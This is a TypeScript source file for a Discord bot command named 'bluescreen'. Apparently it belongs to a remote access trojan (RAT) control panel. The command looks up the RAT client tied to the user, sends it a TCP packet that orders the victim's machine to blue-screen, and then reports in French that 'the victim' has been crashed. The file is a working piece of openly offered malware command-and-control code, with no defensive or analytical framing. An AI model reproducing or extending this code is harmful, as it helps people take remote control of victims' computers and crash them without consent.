import { ChatInputCommandInteraction, EmbedBuilder, PermissionsBitField } from "discord.js";
import Command from "../base/classes/Command";
import CustomClient from "../base/classes/CustomClient";
import Category from "../base/enums/Category";
import Code from "../base/enums/Codes";
import TcpPacket from "../base/classes/TcpPacket";


export default class Bluescreen extends Command {
    constructor(client: CustomClient) {
        super(client, {
            name: "bluescreen",
            description: "Fais bluescreen la victime.",
            category: Category.Utilities,
            dm_permissions: false,
            default_member_permissions: PermissionsBitField.Flags.UseApplicationCommands,
            cooldown: 3,
            options: []
        });
    }

    async Execute(interaction: ChatInputCommandInteraction) {
        let RATClient = await this.client.getRATClient(interaction);
        if (!RATClient) return;

        let packet = new TcpPacket(Code.BLUESCREEN, Buffer.from([0x01]));

        RATClient.send(packet);
        RATClient.disconnect();

        await interaction.reply({
            content: "La victime a été bluescreen.",
        })

    }
}